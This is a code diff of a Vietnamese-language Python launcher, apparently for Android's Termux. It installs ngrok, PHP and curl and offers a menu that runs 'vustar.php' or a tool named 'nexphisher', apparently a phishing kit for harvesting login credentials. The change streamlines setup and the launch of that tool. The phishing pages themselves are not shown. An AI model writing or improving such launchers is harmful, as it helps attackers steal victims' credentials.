@@ -11,9 +11,10 @@ if ip == 'moi':
     os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip')
     os.system('pkg install php')
     os.system('pkg install curl')
-    os.system('apt upgrade')    
+    os.system('apt upgrade')  
+    os.system('bash setup')
+    os.system('bash tmux_setup')
     os.system('clear')
-    os.system('cd')
 ########################################################
     print('Cài đặt hoàn tất!!')
     import requests
@@ -34,15 +35,7 @@ if ip == 'moi':
     if nhap == '1':
         os.system('php vustar.php')
     if nhap == '2':
-        print("Bạn đã cài đặt saver chưa??")
-        print('[1] Tôi chưa cài nó.')
-        print('[2] Tôi đã cài nó.')
-        install_sv=input('Nhập [1] hoặc [2]: ')
-        if install_sv=='1':
-            os.system('bash setup')
-            os.system('bash nexphisher')
-        if install_sv=='2':
-            os.system('bash nexphisher')
+        os.system('bash nexphisher')
 ############################################################################################    
 if ip == 'cu':
     os.system('clear')
@@ -60,12 +53,4 @@ if ip == 'cu':
     if nhap == '1':
         os.system('php vustar.php')
     if nhap == '2':
-        print("Bạn đã cài đặt saver chưa??")
-        print('[1] Tôi chưa cài nó.')
-        print('[2] Tôi đã cài nó.')
-        install_sv=input('Nhập [1] hoặc [2]: ')
-        if install_sv=='1':
-            os.system('bash setup')
-            os.system('bash nexphisher')
-        if install_sv=='2':
-            os.system('bash nexphisher')          
+        os.system('bash nexphisher')          
